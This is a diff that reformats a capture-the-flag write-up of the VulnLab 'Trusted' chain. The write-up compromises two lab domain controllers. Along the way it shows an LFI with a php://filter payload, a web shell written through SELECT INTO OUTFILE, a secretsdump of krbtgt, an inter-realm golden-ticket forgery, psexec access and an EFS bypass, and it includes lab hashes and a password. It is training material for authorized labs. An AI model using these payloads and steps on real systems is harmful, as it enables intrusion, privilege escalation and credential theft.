@@ -1,7 +1,4 @@
-Title: Trusted
-Slug: ctf/vulnlab/chains/trusted
-Date: 2025-04-16 18:00
-Category: CTF
+# Trusted
 
 Hybrid is an easy VulnLab chain.
 
@@ -13,11 +10,11 @@ Target is:
 - 10.10.161.150
 ## Enumeration
 
-~~~shell
+```shell
 sudo nmap -sC -sV -iL targets.txt -oN nmap.txt
-~~~
+```
 
-~~~
+```
 # Nmap 7.95 scan initiated Wed Apr 16 10:16:07 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN nmap.txt
 Nmap scan report for 10.10.161.149
 Host is up (0.032s latency).
@@ -133,23 +130,23 @@ Post-scan script results:
 |_    10.10.161.150
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Apr 16 10:16:48 2025 -- 2 IP addresses (2 hosts up) scanned in 41.11 seconds
-~~~
+```
 
 Host `10.10.161.150` is the DC for the child domain `lab.trusted.vl`.
 Host `10.10.161.149` is the DC for the parent domain `trusted.vl`.
 
 Add host entries to `/etc/hosts`:
 
-![[host-entries.png]]
+![host-entries](../../../images/ctf/vulnlab/chains/trusted/host-entries.png)
 
 Windows host `labdc.lab.trusted.vl` runs XAMPP on port `80`. Nothing too interesting is found beside default html pages; a directory bruteforce is then launched as follows: 
 
-~~~shell
+```shell
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-sma
 ll-directories-lowercase.txt -u http://10.10.161.150/
-~~~
+```
 
-![[labdc-dir-brute.png]]
+![labdc-dir-brute](../../../images/ctf/vulnlab/chains/trusted/labdc-dir-brute.png)
 
 ## labdc.lab.trusted.vl
 
@@ -157,42 +154,42 @@ ll-directories-lowercase.txt -u http://10.10.161.150/
 
 The path `/dev` hosts a web page containing an interesting message:
 
-![[labdc-dev.png]]
+![labdc-dev](../../../images/ctf/vulnlab/chains/trusted/labdc-dev.png)
 
 A php script should be present somewhere; try brute forcing common files;
 
-~~~shell
+```shell
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -u http://10.10.161.150/dev 
-~~~
+```
 
 
-![[labdc-file-brute.png]]
+![labdc-file-brute](../../../images/ctf/vulnlab/chains/trusted/labdc-file-brute.png)
 
 File `db.php` is found but it seems to do nothing interesting:
 
-![[labdc-db-php.png]]
+![labdc-db-php](../../../images/ctf/vulnlab/chains/trusted/labdc-db-php.png)
 
 Navigate trough the site it seems that parameter `view` is used to load html pages:
 
-![[labdc-view-param.png]]
+![labdc-view-param](../../../images/ctf/vulnlab/chains/trusted/labdc-view-param.png)
 
 Trying inserting a not-existing page, a php error is returned leaking the usage of the `include` function:
 
-![[labdc-view-include.png]]
+![labdc-view-include](../../../images/ctf/vulnlab/chains/trusted/labdc-view-include.png)
 
 Abuse this function to exfiltrate `db.php` using php filters:
 
-![[labdc-lfi-php-filter.png]]
+![labdc-lfi-php-filter](../../../images/ctf/vulnlab/chains/trusted/labdc-lfi-php-filter.png)
 
 Filter is the following:
 
-~~~php
+```php
 php://filter/read=convert.base64.encode/resource=db.php
-~~~
+```
 
 The content of `db.php` is the following:
 
-~~~php
+```php
 <?php 
 $servername = "localhost";
 $username = "root";
@@ -205,16 +202,16 @@ if (!$conn) {
 }
 echo "Connected successfully";
 
-~~~
+```
 
 Use `mysql` to connect to the remote database:
 
-~~~shell
+```shell
 mysql -u root -h 10.10.161.150 -p
 mysql -u root -h 10.10.161.150 -p --disable-ssl-verify-server-cert
-~~~
+```
 
-![[labdc-mysql-client.png]]
+![labdc-mysql-client](../../../images/ctf/vulnlab/chains/trusted/labdc-mysql-client.png)
 
 **Note**: use `--disable-ssl-verify-server-cert` flag to skip certificate validation for TLS.
 
@@ -222,37 +219,37 @@ mysql -u root -h 10.10.161.150 -p --disable-ssl-verify-server-cert
 
 In the database `news` is present the table `users` containing some users and password md5 hashes:
 
-![[labdc-db-passwords.png]]
+![labdc-db-passwords](../../../images/ctf/vulnlab/chains/trusted/labdc-db-passwords.png)
 
 Dump users and password hashes with a better format:
 
-~~~sql
+```sql
 select short_handle,password from users \G;
-~~~
+```
 
-![[labdc-db-passwords-formatted.png]]
+![labdc-db-passwords-formatted](../../../images/ctf/vulnlab/chains/trusted/labdc-db-passwords-formatted.png)
 
 Dumped users and hashes are:
 
-~~~
+```
 rsmith:7e7abb54bbef42f0fbfa3007b368def7
 ewalters:d6e81aeb4df9325b502a02f11043e0ad
 cpowers:e3d3eb0f46fe5d75eed8d11d54045a60
-~~~
+```
 
 Try cracking hashes using rainbow tables:
 
-![[labdc-crackstation.png]]
+![labdc-crackstation](../../../images/ctf/vulnlab/chains/trusted/labdc-crackstation.png)
 
 Recoverd password `IHateEric2` for user `rsmith`.
 
 Confirm that found usernames do exist in the DC:
 
-~~~shell
+```shell
 nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='lab.trusted.vl',userdb=usernames.txt" 10.10.161.150
-~~~
+```
 
-![[labdc-confirm-users.png]]
+![labdc-confirm-users](../../../images/ctf/vulnlab/chains/trusted/labdc-confirm-users.png)
 
 ### Privilege Escalation
 
@@ -260,33 +257,33 @@ Found user `rsmith` does not have any particular privilege neither access to the
 
 It's possible to abuse access to the database in order to upload a php reverse shell by running the following query:
 
-~~~sql
+```sql
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\dev\\shell.php'
-~~~
+```
 
 Check user running XAMPP:
 
-![[labdc-revshell.png]]
+![labdc-revshell](../../../images/ctf/vulnlab/chains/trusted/labdc-revshell.png)
 
 Check if it's possible to run powershell commands and that ActiveDirectory module is enabled:
 
-~~~
+```
 http://10.10.161.150/dev/shell.php?cmd=powershell%20-c%20%22Get-ADGroupMember%20-Identity%20%20%27Domain%20Admins%27%20%22
-~~~
+```
 
-![[labdc-confirm-ad-mdoule.png]]
+![labdc-confirm-ad-mdoule](../../../images/ctf/vulnlab/chains/trusted/labdc-confirm-ad-mdoule.png)
 
 Having elevated user `nt authority\system`, it's possible to elevate privileges for `rmsith` by adding him to `Domain Admins` group with the following request:
 
-~~~
+```
 http://10.10.161.150/dev/shell.php?cmd=powershell -c "Add-ADGroupMember -Identity%20 'Domain Admins' -Members 'rsmith' "
-~~~
+```
 
-![[labdc-add-domain-admin.png]]
+![labdc-add-domain-admin](../../../images/ctf/vulnlab/chains/trusted/labdc-add-domain-admin.png)
 
 Confirm that `rsmith` is now domain administrator:
 
-![[labdc-confirm-da.png]]
+![labdc-confirm-da](../../../images/ctf/vulnlab/chains/trusted/labdc-confirm-da.png)
 
 ## trusteddc.trusted.vl
 
@@ -294,91 +291,91 @@ Confirm that `rsmith` is now domain administrator:
 
 With elevated privileges, it's not possible to open an interactive shell:
 
-~~~shell
+```shell
 evil-winrm -u rsmith -p IHateEric2 -i 10.10.161.150 
-~~~
+```
 
 
 Try getting user flag located at `C:\Users\ewalters\Desktop` (but get trolled, lol):
 
-![[labdc-fake-user-flag.png]]
+![labdc-fake-user-flag](../../../images/ctf/vulnlab/chains/trusted/labdc-fake-user-flag.png)
 
 Real user flag is located at `C:\Users\Administrator\Desktop`:
 
-![[labdc-user-flag.png]]
+![labdc-user-flag](../../../images/ctf/vulnlab/chains/trusted/labdc-user-flag.png)
 
 Enumerate trusts for current DC:
 
-~~~powershell
+```powershell
 Get-ADTrust -Filter *
-~~~
+```
 
-![[labdc-trusts.png]]
+![labdc-trusts](../../../images/ctf/vulnlab/chains/trusted/labdc-trusts.png)
 
 A bidirectional trust between `lab.trusted.vl` and `trusted.vl` exists. This could be abused to forge an inter-realm golden ticket and obtain access as administrator to the parent domain. 
 
 Firstly, recover both child and parent domains SIDs: 
 
-~~~shell
+```shell
 nxc ldap 10.10.161.150 -d lab.trusted.vl -u rsmith -p IHateEric2 --get-sidnxc 
 nxc ldap 10.10.161.149 -d lab.trusted.vl -u rsmith -p IHateEric2 --get-sid
-~~~
+```
 
-![[dump-sids.png]]
+![dump-sids](../../../images/ctf/vulnlab/chains/trusted/dump-sids.png)
 
 Use `impacket`'s `secretsdump` to dump `krbtgt`'s NT hash:
 
-~~~shell
+```shell
 impacket-secretsdump lab.trusted.vl/rsmith@10.10.161.150
-~~~
+```
 
-![[labdc-secretsdump.png]]
+![labdc-secretsdump](../../../images/ctf/vulnlab/chains/trusted/labdc-secretsdump.png)
 
 Use SIDs and  `krbtgt`'s hash to forge the golden ticket as follows:
 
-~~~shell
+```shell
 impacket-ticketer -domain lab.trusted.vl -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -nthash c7a03c565c68c6fac5f8913fab576ebd Administrator
-~~~
+```
 
 
-![[labdc-golden-ticket.png]]
+![labdc-golden-ticket](../../../images/ctf/vulnlab/chains/trusted/labdc-golden-ticket.png)
 
 Use forget ticket to open a shell on parent DC:
 
-~~~shell
+```shell
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k lab.trusted.vl/Administrator@trusteddc.trusted.vl -no-pass
-~~~
+```
 
-![[trusteddc-shell.png]]
+![trusteddc-shell](../../../images/ctf/vulnlab/chains/trusted/trusteddc-shell.png)
 
 ### EFS Encryption Bypass
 
 Trying access the root flag but Windows returns `Access is denied`. This is due EFS encryption on the `C:\Users\Administrator\Desktop` files as showed below:
 
-![[trusteddc-root-flag-inaccessible.png]]
+![trusteddc-root-flag-inaccessible](../../../images/ctf/vulnlab/chains/trusted/trusteddc-root-flag-inaccessible.png)
 
 Try decrypting the flag file with current cmd session is unsuccessful since the private key (the encryption certificate) it's not present:
 
-~~~cmd
+```cmd
 cipher.exe /d root.txt
-~~~
+```
 
-![[trusteddc-fail-to-decrypt.png]]
+![trusteddc-fail-to-decrypt](../../../images/ctf/vulnlab/chains/trusted/trusteddc-fail-to-decrypt.png)
 
 After switching to `evil-winrm` (yeah, lazy ass), upload `RunasCs.exe` on the machine and setting password to `Password123!` for `Administrator`, run the following command to obtain the flag content:
 
-~~~powerhsell
+```powerhsell
 net user Administrator Password123!
-~~~
+```
 
-![[trusteddc-change-administrator-password.png]]
+![trusteddc-change-administrator-password](../../../images/ctf/vulnlab/chains/trusted/trusteddc-change-administrator-password.png)
 
-~~~powershell
+```powershell
 .\RunasCs.exe Administrator Password123! "cmd /c type C:\Users\Administrator\Desktop\root.txt"
-~~~
+```
 
-![[trusteddc-runascs.png]]
+![trusteddc-runascs](../../../images/ctf/vulnlab/chains/trusted/trusteddc-runascs.png)
 
 RunasCS will execute the command as the `Administrator` user, having therefore its EFS encryption certificate loaded.
 
